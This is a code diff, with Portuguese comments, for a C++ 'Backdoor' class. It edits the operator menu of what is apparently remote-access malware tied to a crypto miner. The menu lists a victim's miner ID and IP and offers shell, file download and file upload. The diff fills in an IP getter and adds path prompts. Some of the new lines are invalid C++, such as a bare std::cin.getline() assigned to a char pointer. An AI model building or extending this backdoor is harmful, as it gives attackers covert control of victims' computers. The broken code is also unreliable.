@@ -1,5 +1,4 @@
 #include "backdoor.h"
-
 void Backdoor::shell(){
     if(this->is_server){
 
@@ -33,17 +32,17 @@ std::string Backdoor::get_miner_id(){
 
 
 std::string Backdoor::get_miner_ip(){
-    // Logica para pegar IP
+    return  std::string(this->client_ip);
 }
 
 
 void Backdoor::menu(){
     int choice;
-    std::cout << "MINER_ID = " << this->miner_id << "IP = \n" << this->client_ip << std::endl;
+    std::cout << "MINER_ID = " << this->miner_id << " - IP = \n" << this->client_ip << std::endl;
 
     std::cout << "Operações : " << std::endl;
 
-    std::cout << "1) Shell\n2) Download\n3)Upload" << std::endl;
+    std::cout << "1) Shell\n2) Download\n3)Upload\n" << std::endl;
 
     choice = std::cin.get();
 
@@ -53,14 +52,16 @@ void Backdoor::menu(){
     
     }else if(choice == 2){
         char * path;
+        std::cout << "Path: ";
+        path = std::cin.getline();
          // Get path
 
         this->download(path);
 
-
     }else if(choice == 3){
         char *path;
-    
+        std::cout << "Path: ";
+        path = std::cin.getline();
         this->upload(path);
     
     }else{
